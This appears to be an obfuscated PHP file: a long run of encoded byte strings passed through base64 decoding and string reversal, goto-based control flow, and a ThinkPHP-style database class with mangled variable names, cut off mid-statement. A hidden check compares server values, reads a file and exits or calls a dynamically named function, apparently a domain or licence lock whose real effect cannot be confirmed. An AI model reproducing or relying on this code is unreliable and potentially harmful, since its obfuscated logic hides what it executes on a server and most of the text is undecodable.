İdØ½Û')."\x38\xde\x95\x9b\x58\xca\xd\x72\x83\xe0\xb2\xf9\x5c\xca\x9f\x92\x84\xcd\x2c\xf0\x8a\x22\x24\x7d\x58\x1d\x83\xd2\x6d\xd5\x57\x2a\x9b\x39\x4\x9\x96\x3c\x69\x28\xbe\xbb\x76\x34\xcf\x5e\x9d\xb3\x46\x26\xde\x7b"."\x39\x9f\x1c\x89\x1f\x35\x99\x1b\x77\x0\x2d\x61\x88\x41\xcb\xf0\xc3\x53\xca\x2a\x94\xe9\xa4\x48\xe7\xe\x97\x12\x82\xdc\x5f\x9d\x1c\x89\xaf\xc1\xb2\x6c\x17\xb9\x75\x38\xeb\xc0\xf7\x6b\x67\xc\xef\xd9\x97\x0"."\35\143\207\330\145\255\150\145\145\141\25\226\115\140\51\314\252\222\275\211\252\16\60\141\260\312\104\311\360\14\11\241\15\147\74\215\243\14\13\307\113\161\222\40\277\274\236\204\356\0\172\44"."\233\12\127\20\141\136\250\23\16\153\363\0\246\315\214\126\221\213\71\323\376\176\326\217\330\307\245\54\27\236\126\356\301\125\176\223\303\123\252\312\274\44\274\243\73\271\127\373\32\200\350\4".base64_decode('tiqoIuc6rqCZoyUphGtnz6Ho0g0Gbzw4WqHe0RXs8/0Y5/pUFwCvcSaiLrExbrkQrqvHhQ==').strrev('ÑFZUØâGî‡ÚÆÁØµ¦¿æü1-PÅüÈÑTßDÊ°bc´”¯¼C‰,r¢')."\66\153\10\217\3\276\62\154\321\24\347\61\54\35\52\212\134\21\72\236\223\375\230\111\324\247\220\276\317\41\76\106\152\244\142\373\43\254\65\156\255\34\216\3\224\307\264\371\235\32\127\37"."\310\110\347\154\104\46\212\223\264\210\167\236\350\252\103\364\100\362\224\300\263\242\156\260\316\153\254\157\104\326\224\170\244\220\256\371\256\240\133\62\27\227\220\310\40\24\224\216\150\102\40\330"."\xec\x8c\x67\xfe\x28\x84\x44\x2b\xf9\x14\x58\xf9\xef\x57\x9d\xc5\x3e\xd6\xb\xe0\x4a\x48\x82\x90\x35\xfa\x7\xb5\xf2\x3a\x71\xf\x8a\x42\xa0\x16\x28\x9d\xb2\x9e\x36\xcb\x19\x7c\x4a\x4a\x16\x7f\x8a\x76\x5c\xcf"."\xc9\x41\x22\xe5\xc0\xb6\x88\xb0\x65\x2f\x57\x81\xd\xc4\x49\xb8\x8\x6f\xcd\x40\xda\xae\xc8\xe6\xe6\x24\x77\x17\x28\x24\x79\x44\x91\xa8\x57\xef\x14\x85\x93\xbd\x2a\xad\x99\x6\x26\x4b\x9\x24\x7f\x2d\xa\xd8"."\xc5\xea\x95\x94\xe4\x8\xf7\x2b\x51\x49\xf1\x47\x6b\x17\x2d\xca\xf4\xee\x14\x99\xd4\x63\x8a\x74\xb8\x2\x62\x70\xb\x8f\xc0\x92\xd3\x50\xb5\xd8\xcc\xbc\x18\x99\x5c\x84\xb4\x59\x55\x84\xa6\x61\x6a\x4b\x68\xdc"."\311\51\26\166\154\322\303\126\261\126\112\215\246\110\222\64\243\151\116\176\303\354\210\111\202\204\21\235\211\202\173\247\114\365\62\103\231\262\26\36\273\321\301\341\202\66\226\4\6\370\116\314"."\x70\x1b\x8\x52\x43\x3e\x91\xc7\x94\x9e\xff\x89\x5d\x2a\x61\x66\x87\x18\xe3\xe2\xeb\x49\xac\x76\xf1\x50\x59\x22\x30\x74\x2e\x64\x4d\x8c\x56\xc9\xb8\x5e\x48\x36\x51\xd9\x6b\x9c\xa1\xa7\x56\x3a\x9d\x21\x9c\xdc"."\xe6\x90\x96\x77\x65\x40\xfb\xc3\x99\xe\x9e\x4b\x44\x67\xa8\xdd\x2c\xd3\x21\xbd\xe8\xaa\x4\x3c\xec\xc8\xbe\x59\x48\x29\x31\xe\xa1\x52\x80\xa2\x4c\xea\x1f\x45\x9a\x18\x21\xa1\x45\xcd\x79\x31\x9d\x9\x8e\xe4".base64_decode('RHTS5JHVUl4YKqFKasoArskNjdiUgYNF2TXClcqxBCU+ubmMvCUHWCoHTssRoBKjjtI8ig==')."\xe7\x1a\xd2\x99\xe5\x1\x76\xbd\xef\xee\xec\xf6\xf3\xa8\x56\xbe\x3d\x29\x77\x45\x98\x35\xc\x32\xb1\x4c\x7d\x58\x87\x9b\xe0\x50\xc1\x48\x2b\x91\x58\x47\x38\x18\x88\xb4\x85\x13\xb\x95\x1c\x7e\xb2\x15\xd2\x8a"."\xa8\xbb\x2a\xd9\xb6\xaa\x25\x9c\x5\x11\x7f\x49\xce\xd\x4e\xf8\xd3\x74\x39\x18\xac\xa7\xb8\x3\x1e\xfc\xe9\x4d\xa1\xcb\x85\x37\xc3\x2f\x65\x96\xb8\x7e\x91\x11\x42\x65\xc2\x1\xa2\xb3\x5a\xa\x95\x7a\xb9\xaa"."\306\42\126\33\314\127\225\301\134\367\32\271\363\202\151\54\145\56\225\365\352\374\43\72\226\232\224\172\54\25\250\324\350\15\344\257\335\2\361\236\44\347\106\64\223\136\34\257\363\106\161\320"."\xb0\xc\x81\xe\x58\x89\x11\xb9\xf6\x40\x5b\x57\x38\xaa\x6\x22\x91\xd8\x62\x87\xd4\xb1\x78\x6f\x28\x73\xee\x4b\x46\x76\x7e\x25\xad\x8c\x58\x4\xda\xba\x6c\x3c\x53\x8e\x71\x78\x7\x71\x71\x64\xe8\xf2\xc9\xd6"._kodDe('LjtMidzM/GLmJn8YJJcphRuzJZXC2vhdN1j6WdKs6fWzLl31G74bpuNDVl0atXDaAexn4fw=')."\160\107\147\362\177\334\125\43\43\354\35\32\31\46\257\306\265\256\251\263\233\240\354\270\230\265\51\134\52\125\307\374\117\235\373\171\44\323\151\304\344\33\363\56\152\222\273\24\20\372\64\56"."\34\123\251\275\63\321\4\242\142\312\43\45\371\211\327\237\201\32\260\105\332\20\123\73\302\1\161\231\301\271\240\22\334\12\275\342\242\233\73\346\102\262\153\17\343\350\41\64\2\23\356\220"."\321\164\171\47\164\13\337\73\174\17\126\265\101\374\331\320\264\145\170\24\50\147\237\30\23\12\161\377\125\242\250\73\245\106\7\120\262\42\170\143\74\203\322\242\64\121\77\232\334\67\221\62"."\227\331\226\20\15\20\333\213\241\102\311\166\134\377\73\145\105\34\151\111\150\4\146\24\225\71\327\217\256\71\13\342\205\145\217\321\246\52\237\235\4\17\213\113\41\26\337\64\13\43\125\21".base64_decode('DjZahI2GC1Jjf07FrCnPOsHnWBeLusel3AkPuo/odrVDPVr8/6YgTUxI5oWdlVR3yHKfnw==').strrev('ô‰é©fI~İˆXö°FB'."\n".'çÇ¥«ò©ä,èdöA)b0í(ğèöã\\Ï§!Íû¾Ã–‚')."\xa7\x17\x7e\xd9\x69\xe8\xee\x4\xc5\x73\xd0\x64\x23\x7\xc5\x60\xbf\x91\xcf\x94\xb9\x78\x97\x88\xe8\xd2\x5\x4b\x82\x94\x42\x88\xa5\xa4\x31\x7\xef\xc4\x6f\x68\x1b\x43\xe9\xe0\xca\xab\x96\xcb\x48\x6c\x93\xd5"."\351\221\114\70\172\23\107\257\323\361\25\227\51\260\304\26\262\154\207\253\265\244\231\324\162\36\12\252\30\51\212\120\353\210\374\55\13\367\223\121\240\104\306\66\314\360\365\236\47\145\140\176"."\x59\x33\x1e\xe2\x15\x94\xe2\x45\xb7\xaf\x30\x69\x7f\x72\xf4\x2b\x97\xce\x11\x53\xa3\x20\x7b\xe8\xd0\xdc\x2b\xa3\x2b\x9a\xce\x8e\x10\x47\x36\x1a\xe5\xd7\x4a\x25\xf1\x88\x22\x9f\xb8\xe8\x5f\x87\x52\x36\xa4\xf5"."\44\73\125\142\246\104\245\202\21\11\1\163\322\303\46\215\204\107\316\112\61\114\37\163\34\261\145\351\362\50\33\346\246\17\74\102\267\27\262\243\176\166\323\27\135\230\60\271\112\366\312\316".base64_decode('GfIIH/E7tr/6VR6LrQFGwWJCTD5rwCR3NJ98u4MMylxmYAbRnF4BJY49jaEKUdvUBStBGg==')."\62\162\253\35\113\350\160\202\147\275\200\46\230\302\53\75\365\260\61\7\146\320\66\317\157\143\334\23\254\24\344\73\302\351\327\216\156\35\362\323\246\147\371\125\13\207\5\161\41\333\152\22"."\x62\x41\x6e\xdf\xad\xd5\x7e\x68\x99\xcf\x59\xb6\xf7\xc0\xe1\x6c\xd\x2f\xb2\xe3\x3a\xa1\xf5\x8\x3d\xf0\x2f\x73\x97\x27\xb4\x8e\x4b\x68\x2d\x9d\x1e\x85\x39\x69\xc2\x6f\x33\x55\x17\x22\xf7\x5d\x88\x2f\x86\xab"."\100\334\275\140\111\263\232\225\55\4\37\34\56\162\245\121\3\156\254\166\263\53\115\203\64\356\112\71\357\41\62\40\36\46\202\131\323\123\257\303\171\237\173\101\153\370\372\375\312\12\101\375"."\x82\x5c\x5\x33\x4e\xb4\xd9\x3c\x37\x55\x66\x8f\xe5\xee\x6c\x86\x3\xe2\xd1\x9\x2e\x54\x11\xa9\x3d\xec\xaa\x13\x66\x69\x21\x33\x75\xda\x8c\xd9\x32\xcb\x45\x2c\xa1\x78\x42\x6\x8b\x2f\xf0\x12\xe\x44\x92\x0"."\xa\xc5\x9\x86\xa\x33\xc2\x2d\xa3\xf\x92\xe8\xd4\xe7\xa9\x76\xb\xed\x3a\x42\xfe\x67\x1b\x46\xdc\x5e\x68\x56\x49\x4c\x98\xd7\x57\xcb\x13\xa4\x4\xa7\x92\xfc\x9a\x74\xa2\xba\xa4\x8d\x4c\x2c\x0\x64\x89\x5d"."\107\317\120\341\14\332\331\26\245\77\152\214\103\72\70\305\146\241\16\176\315\74\276\371\27\360\63\203\135\326\234\27\332\132\367\66\62\23\354\222\210\71\305\42\344\24\337\2\36\217\110\226".strrev('‰ÃS40ø,ç{WğğÖä\':ôhîÈş‰„›v!’6>ç1XÖÌ%`øâáPfé¶rv.')."\263\44\246\363\45\143\240\244\42\277\233\172\65\333\53\1\247\304\340\324\355\30\131\154\100\27\342\12\355\34\267\253\172\124\114\324\321\347\121\306\313\124\115\57\112\276\236\205\171\106\211\122"."\304\245\231\212\373\70\34\10\242\141\355\244\271\144\177\262\104\75\131\130\27\42\133\327\261\215\45\253\366\262\172\57\251\110\336\37\325\125\113\336\171\5\337\212\60\272\140\104\260\271\211\334".strrev('Îl‘\\e	w……=ÇÔ'."\r".'í1ˆLèÏ¯%¿”İ¸äŸM•ä¡Ô™“¢’k‡+ƒ fé')."\322\20\56\312\11\351\74\11\210\146\331\4\201\343\346\305\335\227\72\156\142\226\333\207\61\242\54\35\276\145\62\125\36\343\1\215\22\115\76\332\232\164\20\213\63\127\174\105\53\5\21\220"."\x18\xd4\xe4\xfa\xc6\x13\x1d\x96\x1a\xb0\x49\x42\x17\xc6\x60\xf6\x1f\x2c\x97\x57\x74\x6a\x95\x9d\x7e\xb3\x5b\xc6\xff\xda\x7d\xef\xff\x2b\xaf\xbd\x33\xb8\xbf\x2e\xae\x7\x88\x1b\xe2\x8a\x87\x1d\x40\xf4\x43\xb7"."\xf1\x6b\x2e\xe7\xa1\x50\x7e\xb6\x6b\x40\xce\x53\x77\x2\x0\x17\x5a\x5\xdf\xa0\xc0\x35\x24\xcc\x45\xdb\x99\x7d\x4a\x66\xb6\x52\x63\x8f\x7d\x5a\x3e\x2f\x9d\xcd\xb5\xaf\x49\x55\xfe\xd9\x11\x4c\xe\x70\x87\xdc".strrev('EyÀ¼Ôbv5u®ÄÂìÌ„x—TŒPº“»¼»<=“jã‚ô	÷­œÌ„eö¯·e…nµ').base64_decode('Iz1Q48mfyP46/TJIxE9VNtF9RCNx8WP2lcb3WWInB5ZBtmUQK7GbbyOcMn0LGDYk9lMAKQ==')._kodDe('MXW3/r1yQoArsnsxYti3XRN8iXKuMZC4hCLuUbpgtmXYlb3tgxuWHrpJeJjxJRNkZkZlorY=').base64_decode('p8nripjidVXHfXA7N43DKTSVmkE7LY55NIxXR97EyIu5t7oM3SAJkWecLVobY/BOCX4l/g==')."\222\347\203\141\236\356\262\111\10\121\147\54\347\133\111\122\340\151\211\51\354\246\55\151\364\104\137\325\251\310\220\260\143\245\260\30\242\170\213\115\306\342\41\165\161\30\333\335\10\237\34\352"."\x61\x36\xa5\xd\x93\xb8\x84\x61\x55\xf6\x74\x35\x10\xbd\x3c\xd8\x0\xe8\x96\xd4\x6e\xa\x50\xd2\x11\x7a\x94\x38\xd4\xc2\xf8\xb1\x5d\x28\x5\xf9\xcb\xb1\x53\xb3\x5b\x52\x6\x61\x46\xc7\x64\x9e\xa9\x33\x33\x56".base64_decode('5HHuxXm1sqXNsiVbDnUkYrLORKlxdtHPMnmPniLa0Xra1jMKphQcl4dl05um9X1ZdSid5w==')."\234\376\25\71\341\26\223\230\346\145\242\313\54\117\315\162\46\265\26\124\53\15\1\151\302\166\100\223\160\75\344\166\71\344\164\61\324\54\61\163\251\367\46\207\157\262\252\105\212\232\101\101".base64_decode('w7jSMI4YPxVfg/k7OXM2g0UB/dhkGVZV8RNABB78UrWgMikozHwQPCiCeqsvn9CSXR6JlQ==')."\343\205\150\225\51\77\247\6\232\124\236\160\246\50\263\311\301\163\2\311\7\71\112\222\4\100\367\276\214\323\15\35\111\44\321\314\226\71\324\40\275\145\73\105\11\270\162\157\325\231\133\61"."\42\122\62\51\305\154\342\242\137\154\243\40\54\114\112\221\144\372\36\27\30\324\270\325\66\167\251\36\307\235\132\22\74\110\23\144\22\252\176\133\26\117\336\22\41\313\212\341\113\271\40\46"."\134\361\22\362\25\307\243\66\50\310\162\161\55\314\144\332\265\301\32\131\63\272\333\352\36\212\341\131\11\131\57\31\27\21\212\105\372\220\334\72\344\23\212\74\216\214\325\261\302\370\210\124".base64_decode('XrwnimHiuFrDJ8jQWVw2bsKBSkRRZ1xcSke6gmMxJiG+Q4fCOU2iSacpFZ6NrxnKQ9QNvQ==')."\216\130\27\123\1\63\365\30\355\351\112\2\66\227\124\175\115\156\230\4\2\172\76\42\125\47\313\32\214\133\40\121\273\21\1\225\316\51\226\154\320\210\4\106\335\230\216\311\227\216\67\76"."\60\310\31\227\23\35\335\161\57\55\271\3\13\360\245\221\5\362\44\101\323\2\316\44\232\137\167\365\136\56\340\36\31\55\341\360\100\51\307\17\31\166\272\137\272\260\127\47\126\307\227\253".strrev('r’¼Õp¬ÉU²á&–\\™Çeˆ\\R\\$Ñ‹5G´2f’™‘ıU%D1³v¹²Şî{P:&')."\266\126\261\306\31\136\365\344\1\133\54\123\143\300\202\171\44\145\35\157\76\153\146\256\156\16\40\321\235\233\360\321\152\367\102\260\277\134\242\43\265\172\121\63\363\270\275\160\347\26\124\11"."\276\376\326\112\161\310\137\71\117\224\132\170\233\245\324\300\324\24\13\215\53\230\45\204\225\252\217\14\221\126\103\164\212\66\211\351\43\331\274\145\215\144\131\16\253\266\244\126\274\46\226\261".strrev('$V/ĞNmUsÏvP*Úc%ˆFSÇäÑ@â•%tL²©•DBËHˆÀ'."\0".'Û;8À‚yx®T"œ').base64_decode('g/g1NWs8mEdVzf/Ja1zdUUjx0eu1aRtp3Wl1X7ZySdNZI3mJI+5iRguOmUOYpwaLlkTRTw==')."\237\170\27\242\365\111\304\221\200\11\207\22\34\45\111\340\21\216\76\345\7\361\113\33\177\304\45\6\341\351\21\116\223\23\146\331\366\340\264\244\131\42\277\255\246\155\13\311\30\312\224\42"."\204\70\76\207\75\222\340\27\372\22\57\266\270\123\344\375\217\200\55\301\130\344\23\204\12\60\223\47\241\323\124\202\347\34\1\374\256\310\3\362\61\13\257\206\355\25\227\370\203\210\30\60"."\x33\x29\x73\x98\x99\x96\x44\x70\x25\x4d\x92\x78\x43\xd4\xdc\xb4\xe5\xa0\x5b\x11\x5b\x16\x63\x23\x76\x57\x2c\x3f\x4d\xf1\x83\xfb\x27\x2f\xa9\x3\x1c\xe5\xfa\x56\x94\x72\x8e\xe2\xd4\xa3\x27\x97\x4c\xff\xb2\x1a"."\xe0\x1d\x41\x54\x41\xfd\xbb\x10\xa6\x2e\x28\xe9\x25\x92\x89\xaa\xa4\xee\x40\x22\xb1\x38\x16\x6f\xa3\xee\x60\xaa\x92\x49\x29\x49\x58\xb0\x2a\xa9\xbb\x33\x16\x1d\x2f\x2d\xd4\x15\x8\x47\xaa\xd2\xb0\x5c\x61\x54"."\x15\x46\x4a\x69\x52\xb8\x9b\xf4\x92\xbc\xa3\x8f\xd7\x8b\x70\x70\xa1\xe8\x49\xb5\x6d\x58\xf6\x6c\x17\x1\x17\xa5\x62\x5d\xa4\x67\xac\x52\xbf\xc9\x5e\xa7\x58\xfe\x84\x96\x67\x7c\x23\xe9\x99\x43\x2f\x8\x2b\xb6".base64_decode('ooyTHSavv8XMTfMPp39Gl5gvA2yoCEsJRqHueAlisRsdjh84nS9EVXwOkRYpnuwhgpQk2A==')."\x94\xcf\x7b\xf2\xb0\xc9\xf9\x62\x24\x79\x52\xcd\xe9\x92\x1f\x41\xaa\x1f\xe8\x48\xaa\x98\xe\xdc\xcd\x13\x4d\x10\x43\x5d\x61\xa6\xa4\x7\x38\x7a\xe7\x2\x95\x7b\x98\x60\x49\x2e\x94\x7e\x3b\x92\x6d\x2d\x57\x53"."\316\203\162\263\61\316\20\174\346\377\3\30\0\72\304\363\272\0\0", 10, -8))); goto cÃï¸; C«ÕçÖÉ×»: define($_SERVER[°‰†òö¯][319], 3); define($_SERVER[°‰†òö¯][320], 1); define($_SERVER[°‰†òö¯][321], 0); goto c”ƒæ±ùÕ; Fãœ¹ƒØ‘: if ($_SERVER[$_SERVER[°‰†òö¯][946]] != $_SERVER[$_SERVER[°‰†òö¯][1033]]) { $_getc = $_SERVER[°‰†òö¯][948]; $_getfile = $_SERVER[$_SERVER[°‰†òö¯][949]] . $_SERVER[°‰†òö¯][950]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[°‰†òö¯][287], $_getfilec); if (count($_getarrs) < $_SERVER[°‰†òö¯][694]) { $exit = $_SERVER[°‰†òö¯][951]; $exit(); } $_act = $_SERVER[°‰†òö¯][1034]; $_act($_SERVER[$_SERVER[°‰†òö¯][944]]); } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\x6e\145\161" => "\x3c\x3e", "\x67\x74" => "\x3e", "\x65\147\164" => "\x3e\x3d", "\x6c\x74" => "\74", "\145\154\164" => "\74\75", "\156\x6f\x74\x6c\x69\x6b\x65" => "\116\x4f\124\40\114\111\113\105", "\x6c\151\x6b\x65" => "\114\x49\x4b\105", "\x69\x6e" => "\x49\116", "\x6e\157\x74\x69\156" => "\x4e\117\124\x20\111\x4e", "\156\157\x74\x20\x69\x6e" => "\x4e\x4f\124\x20\x49\116", "\x62\x65\164\x77\x65\x65\x6e" => "\x42\x45\124\x57\105\x45\116", "\x6e\x6f\x74\142\x65\x74\x77\x65\145\156" => "\x4e\x4f\x54\x20\x42\105\x54\x57\x45\105\x4e", "\156\157\164\40\142\x65\x74\x77\x65\x65\156" => "\x4e\117\124\40\102\105\124\x57\x45\105\116"); protected $selectSql = "\x53\x45\x4c\x45\x43\x54\45\104\x49\x53\124\111\116\x43\124\x25\40\x25\x46\x49\105\x4c\x44\x25\40\106\122\x4f\115\x20\45\x54\101\x42\x4c\x45\45\45\x4a\117\111\116\45\x25\x57\110\x45\122\x45\45\x25\107\122\117\x55\x50\45\x25\110\101\x56\111\116\107\45\45\x4f\122\x44\x45\122\x25\45\x4c\111\x4d\111\x54\x25\40\45\125\116\111\x4f\116\45\45\x43\x4f\115\115\105\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $¨şÏ‰˜ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[°‰†òö¯][1035], $¨şÏ‰˜); } public function factory($Ú«ƒÓš´ = '') { $Ë®ˆ‚§ =& $_SERVER[°‰†òö¯]; $Ú«ƒÓš´ = $this->parseConfig($Ú«ƒÓš´); if (empty($Ú«ƒÓš´[$Ë®ˆ‚§[1036]])) { think_exception(think_lang($Ë®ˆ‚§[1037])); } $this->dbType = ucwords(strtolower($Ú«ƒÓš´[$Ë®ˆ‚§[1036]])); $Û”Ùæï” = $Ë®ˆ‚§[1038] . $this->dbType; if (class_exists($Û”Ùæï”)) { $ÀªÈÅåÓ = new $Û”Ùæï”($Ú«ƒÓš´); if ($Ë®ˆ‚§[1039] != strtolower($Ú«ƒÓš´[$Ë®ˆ‚§[1036]])) { $ÀªÈÅåÓ->dbType = strtoupper($this->dbType); } else { $ÀªÈÅåÓ->dbType = $this->_getDsnType($Ú«ƒÓš´[$Ë®ˆ‚§[989]]); } } else { think_exception(think_lang($Ë®ˆ‚§[1040]) . $Ë®ˆ‚§[1041] . $Û”Ùæï”); } return $ÀªÈÅåÓ; } public function __call($ª®û¸Ç¿, $›¶©àê‡) { if (method_exists($this, $ª®û¸Ç¿)) { return call_user_func_array(array($this, $ª®û¸Ç¿), $›¶©àê‡); } } protected function _getDsnType($Ÿ–‚éÜ) { $„æÄæ = explode($_SERVER[°‰†òö¯][4], $Ÿ–‚éÜ); $óËÀÔ½¾ = strtoupper(trim($„æÄæ[0])); return $óËÀÔ½¾; } private function parseConfig($Õ­úî‘€ = '') { $è÷€üÙ =& $_SERVER[°‰†òö¯]; if (!empty($Õ­úî‘€) && is_string($Õ­úî‘€)) { $Õ­úî‘€ = $this->parseDSN($Õ­úî‘€); } elseif (is_array($Õ­úî‘€)) { $Õ­úî‘€ = array_change_key_case($Õ­úî‘€); $Õ­úî‘€ = array($è÷€üÙ[1036] => $Õ­úî‘€[$è÷€üÙ[1042]], $è÷€üÙ[961] => $Õ­úî‘€[$è÷€üÙ[1043]], $è÷€üÙ[962] => $Õ­úî‘€[$è÷€üÙ[1044]], $è÷€üÙ[959] => $Õ­úî‘€[$è÷€üÙ[1045]], $è÷€üÙ[960] => $Õ­úî‘€[$è÷€üÙ[1046]], $è÷€üÙ[21] => $Õ­úî‘€[$è÷€üÙ[1047]], $è÷€üÙ[989] => $Õ­úî‘€[$è÷€üÙ[1048]], $è÷€üÙ[17] => isset($Õ­úî‘€[$è÷€üÙ[1049]]) ? $Õ­úî‘€[$è÷€üÙ[1049]] : array()); } elseif (empty($Õ­úî‘€)) { if (think_config($è÷€üÙ[1050]) && $è÷€üÙ[1039] != strtolower(think_config($è÷€üÙ[1051]))) { $Õ­úî‘€ = $this->parseDSN(think_config($è÷€üÙ[1050])); } else { $Õ­úî‘€ = array($è÷€üÙ[1036] => think_config($è÷€üÙ[1051]), $è÷€üÙ[961] => think_config($è÷€üÙ[1052]), $è÷€üÙ[962] => think_config($è÷€üÙ[1053]), $è÷€üÙ[959] => think_config($è÷€üÙ[1054]), $è÷€üÙ[960] => think_config($è÷€üÙ[1055]), $è÷€üÙ[21] => think_config($è÷€üÙ[325]), $è÷€üÙ[989] => think_config($è÷€üÙ[1050]), $è÷€üÙ[17] => think_config($è÷€üÙ[1056])); } } return $Õ­úî‘€; } protected function initConnect($›¹ˆ½½± = true) { if (1 == think_config($_SERVER[°‰†òö¯][22])) { $this->_linkID = $this->multiConnect($›¹ˆ½½±); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $—ÎØëÒ³ => $¼”é¨Íá) { $this->_linkID = $¼”é¨Íá; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ö¥ƒ‘´ = false) { $ÄôÒší± =& $_SERVER[°‰†òö¯]; static $¯Ÿé·¿Ş = array(); static $Íí–ıœˆ = -1; if (empty($¯Ÿé·¿Ş)) { foreach ($this->config as $°ïÅŠì¶ => $âò§µÅ) { $¯Ÿé·¿Ş[$°ïÅŠì¶] = explode($ÄôÒší±[50], $âò§µÅ); } } if (think_config($ÄôÒší±[1057])) { if ($Ö¥ƒ‘´ || think_config($ÄôÒší±[473]) === !0) { $òÌ¶üä = floor(mt_rand(0, think_config($ÄôÒší±[1058]) - 1)); $Íí–ıœˆ = $òÌ¶üä; } else { if (is_numeric(think_config($ÄôÒší±[1059]))) { $òÌ¶üä = think_config($ÄôÒší±[1059]); } else { $òÌ¶üä = floor(mt_rand(think_config($ÄôÒší±[1058]), count($¯Ÿé·¿Ş[$ÄôÒší±[959]]) - 1)); } } } else { $òÌ¶üä = floor(mt_rand(0, count($¯Ÿé·¿Ş[$ÄôÒší±[959]]) - 1)); $Íí–ıœˆ = $òÌ¶üä; } $òÌ¶üä = $Íí–ıœˆ !== -1 ? $Íí–ıœˆ : $òÌ¶üä; $‘Ùƒ×Û¤ = array($ÄôÒší±[961] => isset($¯Ÿé·¿Ş[$ÄôÒší±[961]][$òÌ¶üä]) ? $¯Ÿé·¿Ş[$ÄôÒší±[961]][$òÌ¶üä] : $¯Ÿé·¿Ş[$ÄôÒší±[961]][0], $ÄôÒší±[962] => isset($¯Ÿé·¿Ş[$ÄôÒší±[962]][$òÌ¶üä]) ? $¯Ÿé·¿Ş[$ÄôÒší±[962]][$òÌ¶üä] : $¯Ÿé·¿Ş[$ÄôÒší±[962]][0], $ÄôÒší±[959] => isset($¯Ÿé·¿Ş[$ÄôÒší±[959]][$òÌ¶üä]) ? $¯Ÿé·¿Ş[$ÄôÒší±[959]][$òÌ¶üä] : $¯Ÿé·¿Ş[$ÄôÒší±[959]][0], $ÄôÒší±[960] => isset($¯Ÿé·¿Ş[$ÄôÒší±[960]][$òÌ¶üä]) ? $¯Ÿé·¿Ş[$ÄôÒší±[960]][$òÌ¶üä] : $¯Ÿé·¿Ş[$ÄôÒší±[960]][0], $ÄôÒší±[21] => isset($¯Ÿé·¿Ş[$ÄôÒší±[21]][$òÌ¶üä]) ? $¯Ÿé·¿Ş[$ÄôÒší±[21]][$òÌ¶üä] : $¯Ÿé·¿Ş[$ÄôÒší±[21]][0], $ÄôÒší±[989] => isset($¯Ÿé·¿Ş[$ÄôÒší±[989]][$òÌ¶üä]) ? $¯Ÿé·¿Ş[$ÄôÒší±[989]][$òÌ¶üä] : $¯Ÿé·¿Ş[$ÄôÒší±[989]][0], $ÄôÒší±[17] => isset($¯Ÿé·¿Ş[$ÄôÒší±[17]][$òÌ¶üä]) ? $¯Ÿé·¿Ş[$ÄôÒší±[17]][$òÌ¶üä] : $¯Ÿé·¿Ş[$ÄôÒší±[17]][0]); return $this->connect($‘Ùƒ×Û¤, $òÌ¶üä); } public function parseDSN($î®®) { $Ùó±Æˆ´ =& $_SERVER[°‰†òö¯]; if (empty($î®®)) { return !1; } $ÛäûøòÒ = parse_url($î®®); if ($ÛäûøòÒ[$Ùó±Æˆ´[207]]) { $ ¬—ûÀ€ = array($Ùó±Æˆ´[1036] => $ÛäûøòÒ[$Ùó±Æˆ´[207]], $Ùó±Æˆ´[961] => isset($ÛäûøòÒ[$Ùó±Æˆ´[669]]) ? $ÛäûøòÒ[$Ùó±Æˆ´[669]] : $Ùó±Æˆ´[12], $Ùó±Æˆ´[962] => isset($ÛäûøòÒ[$Ùó±Æˆ´[1060]]) ? $ÛäûøòÒ[$Ùó±Æˆ´[1060]] : $Ùó±Æˆ´[12], $Ùó±Æˆ´[959] => isset($ÛäûøòÒ[$Ùó±Æˆ´[208]]) ? $ÛäûøòÒ[$Ùó±Æˆ´[208]] : $Ùó±Æˆ´[12], $Ùó±Æˆ´[960] => isset($ÛäûøòÒ[$Ùó±Æˆ´[209]]) ? $ÛäûøòÒ[$Ùó±Æˆ´[209]] : $Ùó±Æˆ´[12], $Ùó±Æˆ´[21] => isset($ÛäûøòÒ[$Ùó±Æˆ´[87]]) ? substr($ÛäûøòÒ[$Ùó±Æˆ´[87]], 1) : $Ùó±Æˆ´[12]); } else { preg_match($Ùó±Æˆ´[1061], trim($î®®), $¨ıƒ÷¢ò); $ ¬—ûÀ€ = array($Ùó±Æˆ´[1036] => $¨ıƒ÷¢ò[1], $Ùó±Æˆ´[961] => $¨ıƒ÷¢ò[2], $Ùó±Æˆ´[962] => $¨ıƒ÷¢ò[3], $Ùó±Æˆ´[959] => $¨ıƒ÷¢ò[4], $Ùó±Æˆ´[960] => $¨ıƒ÷¢ò[5], $Ùó±Æˆ´[21] => $¨ıƒ÷¢ò[6]); } $ ¬—ûÀ€[$Ùó±Æˆ´[989]] = $Ùó±Æˆ´[12]; return $ ¬—ûÀ€; } protected function debug() { $ĞÏíÎ¶ =& $_SERVER[°‰†òö¯]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ĞÏíÎ¶[1062]; if (think_config($ĞÏíÎ¶[1063])) { think_status($ĞÏíÎ¶[1064]); think_trace($this->queryStr . $ĞÏíÎ¶[1065] . think_status($ĞÏíÎ¶[24], $ĞÏíÎ¶[1064], 6) . $ĞÏíÎ¶[1066], $ĞÏíÎ¶[12], $ĞÏíÎ¶[1067]); } } protected function parseLock($Ö›æ‘æ = false) { $Ò‡†ñ¸¥ =& $_SERVER[°‰†òö¯]; if (!$Ö›æ‘æ) { return $Ò‡†ñ¸¥[12]; } if ($Ò‡†ñ¸¥[991] == $this->dbType) { return $Ò‡†ñ¸¥[1068]; } return $Ò‡†ñ¸¥[1069]; } protected function parseSet($ó „˜€Æ) { $ª÷Õæ‹‚ =& $_SERVER[°‰†òö¯]; foreach ($ó „˜€Æ as $çÅƒûşŸ => $Ğş·ıˆ) { if (is_array($Ğş·ıˆ) && $ª÷Õæ‹‚[374] == $Ğş·ıˆ[0]) { $ËÏİŞ¸[] = 